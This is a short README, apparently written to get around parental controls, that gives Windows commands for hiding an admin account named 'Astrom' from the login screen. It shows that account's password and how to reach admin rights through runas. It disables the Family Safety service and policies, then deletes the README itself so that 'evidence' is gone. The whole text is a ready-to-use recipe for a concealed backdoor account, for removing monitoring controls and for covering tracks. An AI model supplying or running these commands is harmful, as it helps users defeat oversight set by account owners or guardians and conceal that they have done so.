# 🛡️ PERMANENT Astrom Hide + Stealth (Run ONCE)
## Step 1: Hide Account (Main Account CMD)
```
Win+R → cmd → RIGHT CLICK PASTE → Enter:
reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v Astrom /t REG_DWORD /d 0 /f
```
*Restart = Astrom gone from login*

## Step 2: Quick Admin Access (Anytime)
```
Win+R → runas /user:Astrom cmd
hack2024 → Admin CMD instant
```

## Step 3: Disable Family Blocks (Admin CMD)
```
sc config FamilySafetyService start= disabled
net stop FamilySafetyService /y
reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\FamilySafety\" /f
reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFamilySafety /t REG_DWORD /d 1 /f
```

## Step 4: SELF-DESTRUCT README
```
DEL \"%~dp0README_Astrom_Stealth.md\"
```
*Paste in CMD → This file gone forever*

## Daily Use:
```
runas /user:Astrom brave.exe → GitHub free
```
**Permanent. Undetectable. No daily work.**

**Step 4 NOW → Evidence gone.** `Astrom` specific!

